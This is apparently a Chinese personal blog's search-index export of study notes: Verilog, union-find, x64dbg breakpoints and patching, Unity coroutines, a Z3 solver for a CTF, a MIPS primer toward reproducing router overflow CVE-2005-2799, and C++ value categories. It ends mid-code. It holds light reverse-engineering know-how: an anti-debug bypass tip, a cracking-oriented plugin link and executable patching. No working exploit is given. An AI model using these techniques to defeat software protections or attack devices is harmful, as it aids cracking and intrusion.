<p>12'dz               //位宽为12的10进制数，其值为高阻值（形式一）</p>
<p>12'd?               //位宽为12的10进制数，其值为高阻值（形式二）</p>
<p>8'h4x               //位宽为8的十六进制数，其低4位为不定值</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172046844.png" /></p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>校内</category>
        <category>计组</category>
      </categories>
  </entry>
  <entry>
    <title>weighted q-Union算法及网状通路建立</title>
    <url>/weighted-q-union-suan-fa-ji-wang-zhuang-tong-lu-jian-li/</url>
    <content><![CDATA[<p>假设我们用树解决这个问题</p>
<p>则我们会使用到单向树（由单链表衍生）</p>
<p>为了简化出核心思想，这里不使用地址的指向作为单链表，而是使用ID入口</p>
<p>也就是说我们维护ID数组，数组的下标为元素的ID，数组的内容为对应元素的父节点ID</p>
<p>通过这种方式回溯根节点</p>
<p>当我们想要引入权重时，我们只需要再引入并维护sz数组，sz数组的每一项含义为</p>
<p>下标作为节点序号，对应下标的内容为 该节点所在的整个树的节点个数</p>
<p>在合并前检查两树大小，小树在下，大树在上</p>
<p>然后这里有一个关于树的增长速率的简单说明</p>
<p>如果一个树有N层，那么他大致的总节点数量在2^N这个数量级</p>
<p>反过来说，如果一个树有N个节点，那么他的层数大致会有lgN这个数量级</p>
<p>如果同步增正N+a，那么lg（N+a），递推公式可证，引入权重的树的归并是lg（N）的时间复杂度</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181053606.png" /></p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>校内</category>
        <category>数据结构</category>
      </categories>
  </entry>
  <entry>
    <title>why ebp is empty while gcc compiled with -ggdb  arg(without optimization)</title>
    <url>/why-ebp-is-empty-while-gcc-compiled-with-ggdb-argwithout-optimization/</url>
    <content><![CDATA[<p>The answer basically is "why IT'S called calling-convention rather than requirement"</p>
<p>for _cdecl ,it suggest fn set-up its env and tear-up by itself</p>
<p>so a fn is actually can run without save ebp,since it's a special fn</p>
<p>while there is still a safty reason that to prevant from shellcode 'leave' get control of stack frame of _libc_start_main fn</p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>存档</category>
      </categories>
      <tags>
        <tag>调用约定</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows PyCharm远程解释Linux PWNtools配置过程</title>
    <url>/windows-pycharm-yuan-cheng-jie-shi-linux-pwntools-pei-zhi-guo-cheng/</url>
    <content><![CDATA[<h2 id="背景">背景</h2>
<p>在虚拟机Linux写脚本实在是太蛋疼了，虚拟机外面Windows写的话，又没有pwntool语法高亮，物理机Linux虽然笔者自己用着挺舒服，但是时不时就会需要用一下Windows独占应用，比如腾讯课堂这种沙雕玩意，对wine优化也不够好</p>
<p>最后配置了一下远程python解释器，pwntool挂在服务器上，有些ssh和nc操作直接走服务器专线带宽，更容易ping通</p>
<h2 id="正文">正文</h2>
<p>查文章的时候看到前人的文章里面有很多报错，意外的是笔者自己没遇到任何问题</p>
<p>直接在解释器里面点击添加解释器-添加SSH</p>
<p>然后一直下一步就好了</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181053542.png" /></p>
<h2 id="补充">补充</h2>
<p>pwntool的ssh等连接命令的输出会有一个转啊转的ASCII动画</p>
<p>pycharm不支持显示那玩意</p>
<p>会直接卡死</p>
<p>笔者现在最优解是VScode配置remote develop，用下来没啥问题，很舒服</p>
<p>就是在切换VPN的时候会抽风一下，GitHub上面找到有人反馈了一下，但是微软没搭理emmm</p>
<p>总的来说小问题</p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>存档</category>
      </categories>
      <tags>
        <tag>环境配置</tag>
      </tags>
  </entry>
  <entry>
    <title>WindowsAPI底层开发时遇到的常见类型</title>
    <url>/windowsapi-di-ceng-kai-fa-shi-yu-dao-de-chang-jian-lei-xing/</url>
    <content><![CDATA[<h2 id="背景">背景</h2>
<p>第一次看Windows头文件的时候,各种奇奇怪怪的类型看的头疼</p>
<p>这两天正好接触了一些Windows底层,看懂Windows底层开发所使用的类势在必行.....</p>
<h2 id="正文">正文</h2>
<p>H 句柄</p>
<p>WND 窗体</p>
<p>P 指针</p>
<p>T 允许多编码自动转换</p>
<p>C 常数</p>
<p>sz 零结尾缓冲区</p>
<p>M 组件 或者 消息</p>
<p>W 宽字</p>
<p>A ANSI字符</p>
<p>Rtl RUNTIMELIB</p>
<p>S shell（广义的）</p>
<p>Def default</p>
<p>持续完善中</p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>存档</category>
      </categories>
      <tags>
        <tag>Windows API</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows的一个疑似Bug</title>
    <url>/windows-de-yi-ge-yi-si-bug/</url>
    <content><![CDATA[<p>2023年3月18日更新 解决方法 安装revios 而非标准Windows</p>
<p>可重复性高,坑死我了,个人主观感受是很确定为bug</p>
<p>复现操作：</p>
<p>在安装Windows操作系统时，会有一步骤让你登录账号，可以选择本地账户，也可以登录微软联机账户</p>
<p>如果先在wifi界面不连接wifi，然后来到登陆页面，然后再返回去链接wifi，然后再来到登陆页面用本地账户登录，然后正常安装，安装完成之后在设置页面登录微软联机账户</p>
<p>这时候就基本废了</p>
<p>虽然你显示是管理员，但其实你现在登录的账户并没法直接操作C盘内的任何文件，如果是在文件管理器页面倒还好，可以现场给权限，但是如果是在文本编辑类的程序里面，比如notepad或者VScode，完全不能保存</p>
<p>上述内容测试平台：DELL G5 5587，所有驱动均为厂商推荐的最新版本</p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>存档</category>
      </categories>
      <tags>
        <tag>环境配置</tag>
      </tags>
  </entry>
  <entry>
    <title>X64dbg API断点设置方法以及其他几个小技巧</title>
    <url>/x64dbg-api-breakpoint/</url>
    <content><![CDATA[<h1 id="背景">背景</h1>
<p>在看逆向工程核心原理的时候,文章的示例使用的是OD,但是OD的界面实在是看着不舒服2333,于是自行换用了几乎等价的工具X64dbg进行实验,但是网上x64dbg的资源和教程的数量和质量相比于OD来说实在是太少了</p>
<p>谷歌搜索<code>X64dbg API断点</code> 前五篇文章都没能以较便捷的方式解决问题</p>
<p>于是去翻了一下官方的文档,同时意外的发现官方文档里面总结了许多小技巧,因此一并总结在本文当中</p>
<h1 id="阅读本文前置知识">阅读本文前置知识</h1>
<ul>
<li>对OD有一定的了解</li>
</ul>
<h1 id="正文">正文</h1>
<p>先直接说解决方法,然后在谈一下期间踩得一些坑和走的一些弯路</p>
<p>首先确定你想要找的API的<strong>正式全名</strong>,例如MessageBoxW</p>
<p>然后在命令窗口里面输入<code>bp &lt;APIname&gt;</code></p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181049876.png" /></p>
<p>命令窗口如图所示</p>
<p>这里要注意的是不要用模糊名</p>
<p>比如<code>MessageBox</code>,<code>messagebox</code>等,(需要严格区分大小写)</p>
<p>当API被调用的时候,堆栈顶会压入返回地址,再根据该地址即可到达调用方位置</p>
<p>这个方法有一个致命问题:当符号表被抹干净的时候此方法失效,因为bp命令的参数是在PE文件头里面搜索的</p>
<p>再次用英文搜索 X64dbg API breakpoint 找到了一个插件</p>
<p>https://www.findbestopensource.com/product/0ffffffffh-api-break-for-x64dbg</p>
<p>可视化界面,树状分类,相对来说好用很多</p>
<p>5月3日更新:</p>
<p>在52论坛上找到了一个更好用的API断点插件,插件主页面罗列了大部分破解软件过程中常见的关键API</p>
<p>地址如下</p>
<p>https://www.52pojie.cn/thread-1384349-1-1.html</p>
<h2 id="其他小技巧">其他小技巧</h2>
<ul>
<li><p>在反汇编视图中，按下鼠标中键可将选定的地址复制到剪贴板中。</p></li>
<li><p>你可以通过重命名"x64dbg.exe"或"x32dbg.exe"为另一个名称，来重命名 x64dbg 的窗口。这样可以绕过一些反调试检测</p></li>
<li><p>按 Ctrl+H 可以高亮某个寄存器。</p></li>
<li><p>双击某个地址，就会进入以该地址为基址的相对寻址模式</p></li>
</ul>
]]></content>
      <categories>
        <category>笔记</category>
        <category>存档</category>
      </categories>
      <tags>
        <tag>调试</tag>
      </tags>
  </entry>
  <entry>
    <title>x64dbg 保存更改到可执行文件</title>
    <url>/x64dbg-patch/</url>
    <content><![CDATA[<p>背景介绍接不说了,直接正文讲解遇到的问题和解决方案</p>
<p>本文示例程序来自《逆向工程核心原理》的hello world 实验</p>
<p>找到MessageBoxW函数之后</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172107192.png" /></p>
<p>找到目标字符串<code>4092A0:L"Hello World!"</code></p>
<p>Ctrl+G跳转4092A0发现数据被识别成代码</p>
<p>解决方案为在下方内存窗口当中查找,但是由于内存窗口默认显示外部dll的调用堆栈情况</p>
<p>因此需要在内存布局选项卡当中进入.rdata段,然后跳转至4092A0</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172111941.png" /></p>
<p>选中需要修改的部分（注意小端模式）然后ctrl+E（edit）</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172110139.png" /></p>
<p>修改完成后再ctrl+P（patch）</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172110253.png" /></p>
<p>选择修补文件，另存为后缀名exe文件即可</p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>存档</category>
      </categories>
  </entry>
  <entry>
    <title>枚举,结构体,yield return与多线程通信</title>
    <url>/yield-return/</url>
    <content><![CDATA[<h2 id="背景">背景</h2>
<p>Unity开发角色死亡后过一段时间复活,但是有如下问题</p>
<p>角色死亡后<code>setActive(false)</code>后,角色所属组件(包括PlayerController.cs)都将不再执行,此时无法通过脚本拉起角色复活函数;解决方法有两个</p>
<p>第一个比较傻,但也简单:设置一个透明空类在地图的犄角旮旯里面,持续监听player状态,在角色死亡后,复活CD结束时拉起角色复活函数</p>
<p>第二个是业界常规做法,使用枚举器+yield return新建一个独立于Update函数的线程,监听已死亡的角色状态</p>
<h2 id="正文">正文</h2>
<p>先附上一段Unity文档,这个文档解决了我的许多疑问<a href="https://docs.unity3d.com/Manual/Coroutines.html">https://docs.unity3d.com/Manual/Coroutines.html</a></p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181049147.png" /></p>
<p>简单来说,枚举迭代被用于多线程通信</p>
<p>对于一般的C#脚本来说,主要的线程用于持续调用Update函数</p>
<p>我们需要使用yield return配合函数声明为IEnumerator返回值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IEnumerator foo()&#123;</span><br><span class="line"></span><br><span class="line">yield return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>所以只需要</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">   void Update()</span><br><span class="line">   &#123;</span><br><span class="line">       </span><br><span class="line">       if (!diamond.activeInHierarchy)</span><br><span class="line">       &#123;</span><br><span class="line">           spawnDiamondCo();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   public void  spawnDiamondCo()</span><br><span class="line">   &#123;</span><br><span class="line">       StartCoroutine(&quot;spawnDiamond&quot;);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">public IEnumerator spawnDiamond()</span><br><span class="line">   &#123;</span><br><span class="line">       yield return new WaitForSeconds(3);</span><br><span class="line">       randomX = Random.Range(-5, 5);</span><br><span class="line">       randomY = Random.Range(-4.5f,4.5f);</span><br><span class="line">       pos = new Vector3(randomX,0.0f , randomY);</span><br><span class="line">       diamond=Instantiate(diamondPrefab,pos,Quaternion.identity);</span><br><span class="line">       StopCoroutine(&quot;spawnDiamond&quot;);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>别忘了 StopCoroutine("spawnDiamond")</p>
<p>另外还有一种情况,需要一个协程A拉起另一个协程B再由B拉起C</p>
<p>此时如何正确退出</p>
<p>两种办法</p>
<p>第一种FILO</p>
<p>第二种直接结束最高级的父协程,测试下来没啥问题</p>
]]></content>
      <categories>
        <category>开发</category>
        <category>GamePlay</category>
      </categories>
  </entry>
  <entry>
    <title>Z3py库解逆向工程题目</title>
    <url>/z3py-ku-jie-ni-xiang-gong-cheng-ctf/</url>
    <content><![CDATA[<h2 id="正文">正文</h2>
<p>先安装，建议用whl手动安装而非apt、pip，同时注意给管理员权限，以免初始化失败</p>
<p>然后有几个z3的坑点，一个是bitvector和bitvectors这类变量，一个是单数一个是复数</p>
<p>如果一次性初始化很多变量就用带s的</p>
<p>同时注意只有bitvector才可以进行位运算</p>
<p>初始化变量时，建议把传参字符串和外部变量名统一，如果不统一有可能可以解释器通过，但是一定会对编辑器的语法高亮造成一定困扰</p>
<p>另外，需要先check才能打印结果，在命令行中结果可以直接输出，但是在编辑器界面需要加一句print</p>
<h2 id="示例">示例</h2>
<p>（2023年3月18日更新：示例文件链接丢失）</p>
<p>首先是通过简单分析发现一系列很深的函数</p>
<p>通过查看Num1和Num2的xref发现只有四个函数对他们进行了特殊操作</p>
<p>这个想法是这样的：</p>
<p>首先理解ecx是this指针，然后观察xref里面哪个寄存器出现了很多次，就首先排除与那个寄存器相关的操作，因为这个操作大概率是 duplicated，然后注意观察cmp调用</p>
<p>最终选出四个约束函数</p>
<p>添加到z3里面</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line">x,y=BitVecs(&#x27;x y&#x27;,32)</span><br><span class="line">s=Solver()</span><br><span class="line">s.add(y/2-x == -107702)</span><br><span class="line">s.add(y &amp; 1 == 0)</span><br><span class="line">s.add(y ^ 333509 == x)</span><br><span class="line">s.add(881778^666&gt;=y)</span><br><span class="line">print(s.check())</span><br><span class="line">print(s.model())</span><br></pre></td></tr></table></figure>
<p>顺便说一下from xxx import *</p>
<p>和</p>
<p>import xxx的区别</p>
<p>前者相当于include -r</p>
<p>后者相当于include --none</p>
<p>从学习py开始困扰我的问题终于解决了。。。</p>
]]></content>
      <categories>
        <category>信息安全</category>
        <category>二进制</category>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>Z3py</tag>
      </tags>
  </entry>
  <entry>
    <title>家用路由器0day挖掘笔记（1）MIPS32平台逆向入门指南</title>
    <url>/jia-yong-lu-you-qi-0day-wa-jue-1/</url>
    <content><![CDATA[<h2 id="前言">前言</h2>
<p>本系列受众为对Linux端开发，尤其是socket程序开发（包括码代码和设计理念）有一定了解，对X86平台逆向有一定了解，但对MIPS平台逆向基础薄弱的读者。本系列记录笔者遇到的问题和整体操作思路</p>
<p>本系列目标为复现并完全理解CVE-2005-2799，并在一定程度上拥有敏锐发现二进制敏感操作，以及思考他们可能造成什么样问题的能力</p>
<p>exp预期使用python编写</p>
<p><strong>禁止转载</strong> <strong>禁止转载</strong> <strong>禁止转载</strong> <strong>欢迎借鉴 欢迎借鉴 欢迎借鉴</strong></p>
<h2 id="正文">正文</h2>
<p>Linksys WRT54G是一款SOHO无线路由器，千禧年初，该型号在极客间颇为有名，主要原因有：支持刷第三方固件，双天线相控阵信号通信等，功能十分强大！而这也正是 CVE-2005-2799 受影响的设备。</p>
<p>该漏洞存在于路由器内HTTPD程序的apply.cgi文件下，其对POST请求的验证不够完善，经一番不算太难的操作后便可溢出缓冲区，直接提权至root，该漏洞系远程任意代码执行漏洞，属于高危漏洞</p>
<p>本文将带大家从x86-PC平台逆向，进入嵌入式逆向的世界</p>
<h3 id="mips32指令集汇编">MIPS32指令集，汇编</h3>
<p>本小节只是一个基础，并非为了让大家精通MIPS32，笔者这里只会讲我们需要的内容</p>
<p>MIPS是RISC，所以相比于操作内存而言，大部分时候我们操作的都是寄存器</p>
<p>MIPS32架构有32个通用寄存器，基本都会用到，但是总共只有12种，很好记忆(下面原本是有个表格的, 但是复制过来的时候不好复制, 后来找不到原始图了(因此也没法截图), 所以就这样的raw格式了, 反正也没什么人看, 如果你看到了的话, 请以此为线索再去互联网上搜一搜)</p>
<p>ID</p>
<p>名称</p>
<p>备注</p>
<p>0</p>
<p>$0，zero</p>
<p>始终为零，作为常量寄存器</p>
<p>1</p>
<p>$at</p>
<p>保留，向上兼容</p>
<p>2-3</p>
<p><span class="math inline">\(v0~\)</span>v1</p>
<p>函数返回值寄存器</p>
<p>4-7</p>
<p><span class="math inline">\(a0~\)</span>a3</p>
<p>函数前四个参数</p>
<p>8-15</p>
<p><span class="math inline">\(t0~\)</span>t7</p>
<p>临时变量寄存器</p>
<p>16-23</p>
<p><span class="math inline">\(s0~\)</span>s7</p>
<p>帧变量寄存器，函数返回时必恢复</p>
<p>24-25</p>
<p><span class="math inline">\(t8~\)</span>t9</p>
<p>临时变量寄存器</p>
<p>26-27</p>
<p>$k0 $k1</p>
<p>中断寄存器</p>
<p>28</p>
<p>$gp</p>
<p>全局指针寄存器，静态变量指针寄存器</p>
<p>29</p>
<p>$sp</p>
<p>栈顶指针寄存器</p>
<p>30</p>
<p>$fp</p>
<p>栈帧寄存器</p>
<p>31</p>
<p>$ra</p>
<p>返回地址寄存器</p>
<p>几个点强调一下</p>
<p>首先是 RISC 会尽可能操作寄存器，其次是立即数，<strong>内存是最万不得已的选择</strong></p>
<p>因此对于0这个常见的常量，MIPS特意分了一个寄存器，此外一些指令会利用这个寄存器进行一些优化</p>
<p>比如MOVE <span class="math inline">\(t0,\)</span>t1，这一指令在底层会被优化为ADD $t0,<span class="math inline">\(0,\)</span>t1——与0相加；由于某些底层设计的原因，后者速度更快，然而前者更符合大多数程序员的直觉，因此有了这种自动优化</p>
<p>“ 尽可能操作寄存器 ”也能很好解释为什么这么多临时变量寄存器，如果在PC上面的话，x86更多是栈储存临时变量</p>
<p>让人颇为在意的是两个返回值寄存器</p>
<p>大部分情况下我们用不到v1返回值寄存器，只会使用v0，但对于某些高级语言的元组语法糖，或在tuple结构中，或是手写汇编函数结构的情况下，都有可能会用到第二个返回值寄存器</p>
<p>在一般情况下，第二个返回值寄存器用于储存32位架构下的乘除结果（这一结果有可能是64位，至于为什么请查阅《加密与解密》）</p>
<p>MIPS64保留了双返回值寄存器这一设计以向下，向上兼容，预期目的是存储128位结果，不过笔者有生之年应该看不到233</p>
<p>t系列寄存器按照约定，不需要保存，也不需要清理，随时都可以使用，省去了PUSHAD的开销</p>
<p>s系列寄存器则需要保存，需要恢复现场</p>
<p>至于fp寄存器，由于MIPS平台体力弱小，因此栈帧寄存器常常会被寄存器“优化掉”，当作普通的临时变量寄存器</p>
<p>gp寄存器：由于最上面提到的原因，即“尽可能直接操作寄存器”，所以MIPS专门为了静态成员变量，设计了一个寄存器，也就是gp寄存器</p>
<p>ra寄存器，在X86下面，call之后的返回地址直接入栈，但是MIPS平台要尽可能少操作内存，因此JAL（相当于CALL）之后，返回地址会被存入寄存器当中（也就是ra寄存器）</p>
<p>另外是三个特殊寄存器：计数器PC，高位寄存器HI，低位寄存器LO，用于乘法时保存高低位，用于除法时LO存商，HI存余数</p>
<p>此外MIPS还有一些不得不注意的特点</p>
<p>MIPS没有flag寄存器任何临时寄存器都可以拿去当作flag寄存器</p>
<p>MIPS指令集的指令固定4字节长度，而且必须以4字节对齐，因为MIPS-CPU为了高效，没有设计在非对齐下的行为</p>
<p>跳转指令上下寻址空间256MB</p>
<p>条件分支指令上下寻址空间256KB</p>
<p>MIPS为了效率，采用高度流水线，有较大的分支延迟，当跳转指令的目标地址刚发送给CPU后端，而跳转指令本身还没执行时，跳转分支语句的下一条指令（地址相邻的下一条，而非跳转的目的地）就已经在装载并即将执行，<strong>这点非常重要，这会影响整个跳转流程分析</strong></p>
<p>汇编部分我们只列出部分打头的字母代表的意思，详细内容查白皮书就行，这里就不复制粘贴了</p>
<p>L/S LOAD/STORE：存到寄存器/存到内存</p>
<p>MOVE：寄存器之间移动值</p>
<p>S SET（比较）：比如SLT SET LESS THAN 小于比较</p>
<p>B BRANCH：分支</p>
<p>J JUMP：跳转</p>
<h3 id="大小端">大小端</h3>
<p>MIPS平台一般是大端字节序，这与普通的X86-Linux平台正好相反，稍微注意下即可</p>
<h2 id="结束语和预告">结束语和预告</h2>
<p>现在已经基本掌握MIPS平台汇编的几个重要知识点，我们后续会在实战中巩固，敬请期待</p>
]]></content>
      <categories>
        <category>信息安全</category>
        <category>0day</category>
      </categories>
      <tags>
        <tag>0day</tag>
        <tag>路由器</tag>
        <tag>二进制</tag>
      </tags>
  </entry>
  <entry>
    <title>C++左值和右值:一文解决</title>
    <url>/yi-lao-yong-yi-de-jie-jue-c-zuo-zhi-you-zhi-xiang-guan-wen-ti/</url>
    <content><![CDATA[<p>(本节仍然处于草稿)</p>
<ol type="1">
<li>左值右值实际上还需要更加清晰的定义生命周期这一概念 因此:</li>
</ol>
<p>(这里需要写明xvalue不允许延长生命周期, 但是prvalue可以)</p>
<p>https://time.geekbang.org/column/article/169268</p>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202305011533431.png" alt="" /><figcaption>image-20230501153305353</figcaption>
</figure>
<p>首先<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304281840977.png" alt="image-20230428184043911" /></p>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304281927332.png" alt="" /><figcaption>image-20230428192707304</figcaption>
</figure>
<p>需要注意的是, xvalue和prvalue是不可以取地址的, 但是右值引用对象可以取地址</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> &amp;&amp;r = std::<span class="built_in">move</span>(a);</span><br><span class="line"><span class="type">int</span> *p = &amp;r;  <span class="comment">// OK</span></span><br></pre></td></tr></table></figure>
<p>因为右值引用对象<code>r</code>是一个r左值lvalue, 他所引用绑定的内容才是右值</p>
<p>需要注意一点, 我们说左值的时候, 一般只包括了"纯左值", 而不包括xvalue</p>
<p>但是我们说右值的时候, 往往是不仅仅指的是纯右值, 而是还包括了xvalue</p>
<p>当然, 这只是查阅资料的时候发现的一个约定俗成的东西, 不代表任何规范</p>
<p>(std::move的结果是一个xvalue, 可以绑定到右值引用但不能绑定到左值引用, 但是分类图上 一般把xvalue视作rvalue和glvaue的交集, 这一交集的描述似乎暗示了xvalue可以绑定到左值引用和右值引用,但是显示中xvalue只能绑定到右值引用和const左值引用上)</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> temp = <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span>&amp; a = temp;</span><br><span class="line"><span class="type">int</span>&amp; b = std::<span class="built_in">move</span>(temp);<span class="comment">//error</span></span><br><span class="line"><span class="type">int</span>&amp;&amp; c = std::<span class="built_in">move</span>(temp);</span><br><span class="line"><span class="type">int</span>&amp;&amp; d = <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304282001939.png" alt="" /><figcaption>image-20230428200128915</figcaption>
</figure>
<p>这里继续拓展: 我们在网上的一些资料可以看到一种说法, 那就是xvalue has identity</p>
<p>以下是一些资料的例子</p>
<p>https://stackoverflow.com/questions/3601602/what-are-rvalues-lvalues-xvalues-glvalues-and-prvalues/38169963#38169963</p>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304282013145.png" alt="" /><figcaption>image-20230428201350079</figcaption>
</figure>
<p>https://learn.microsoft.com/en-us/windows/uwp/cpp-and-winrt-apis/cpp-value-categories</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304282027910.png" alt="image-20230428202755863" />我这边的现阶段的建议是忘掉这点</p>
<p>因为对这点的持续追问会最终会追溯到为什么下面的代码是错误的</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="type">int</span> *b = &amp;std::<span class="built_in">move</span>(a); <span class="comment">// ERROR</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但是对上述代码的追问最终会指向:</p>
<p>From [expr.unary.op]: https://stackoverflow.com/questions/50783525/what-does-it-mean-xvalue-has-identity</p>
<blockquote>
<p>The result of the unary <code>&amp;</code> operator is a pointer to its operand. The operand shall be an lvalue [...]</p>
</blockquote>
<p>语言硬性规定了这样的行为</p>
<p>所以我建议忘记identity这点</p>
<p>edit: 你可以把identity理解为脱离生成他的地方后, 仍然可以被二次使用的一种性质, 而不要像大多数资料那样, 理解成地址, 因为实际上xvalue不允许取地址操作</p>
<p>一个有意思的示例https://www.tutorialspoint.com/cplusplus/returning_values_by_reference.htm</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctime&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">double</span> vals[] = &#123; <span class="number">10.1</span>, <span class="number">12.6</span>, <span class="number">33.1</span>, <span class="number">24.1</span>, <span class="number">50.0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">double</span>&amp; <span class="title">setValues</span><span class="params">(<span class="type">int</span> i)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> vals[i];   <span class="comment">// return a reference to the ith element</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">double</span>&amp;&amp; <span class="title">getValues</span><span class="params">(<span class="type">int</span> i)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> std::<span class="built_in">move</span>(vals[i]);   <span class="comment">//</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span>&amp;&amp; a = <span class="built_in">getValues</span>(<span class="number">1</span>);</span><br><span class="line">    std::cout &lt;&lt; a &lt;&lt; std::endl;</span><br><span class="line">    <span class="built_in">setValues</span>(<span class="number">1</span>) = <span class="number">20.23</span>; <span class="comment">// change 2nd element</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个可以在Eigen矩阵库里面见到类似的操作</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">Eigen::MatrixXf result = Eigen::MatrixXf::<span class="built_in">Zero</span>(<span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">result.<span class="built_in">topLeftCorner</span>(<span class="number">3</span>, <span class="number">3</span>) = mat3x3;</span><br></pre></td></tr></table></figure>
<p>关于函数的返回值, 需要注意的是</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span>   <span class="title">prvalue</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span>&amp;  <span class="title">lvalue</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span>&amp;&amp; <span class="title">xvalue</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure>
<p>正是因为如此, 上面的例子才得以实现</p>
<p>这里有一个小问题暂时笔者没有解决</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="comment">// std::move</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">shape</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="keyword">virtual</span> ~<span class="built_in">shape</span>() &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">circle</span> : <span class="keyword">public</span> shape &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="built_in">circle</span>() &#123; <span class="built_in">puts</span>(<span class="string">&quot;circle()&quot;</span>); &#125;</span><br><span class="line">  ~<span class="built_in">circle</span>() &#123; <span class="built_in">puts</span>(<span class="string">&quot;~circle()&quot;</span>); &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">triangle</span> : <span class="keyword">public</span> shape &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="built_in">triangle</span>() &#123; <span class="built_in">puts</span>(<span class="string">&quot;triangle()&quot;</span>); &#125;</span><br><span class="line">  ~<span class="built_in">triangle</span>() &#123; <span class="built_in">puts</span>(<span class="string">&quot;~triangle()&quot;</span>); &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">result</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="built_in">result</span>() &#123; <span class="built_in">puts</span>(<span class="string">&quot;result()&quot;</span>); &#125;</span><br><span class="line">  ~<span class="built_in">result</span>() &#123; <span class="built_in">puts</span>(<span class="string">&quot;~result()&quot;</span>); &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">result</span></span><br><span class="line"><span class="function"><span class="title">process_shape</span><span class="params">(<span class="type">const</span> shape&amp; shape1,</span></span></span><br><span class="line"><span class="params"><span class="function">              <span class="type">const</span> shape&amp; shape2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;process_shape()&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">result</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span 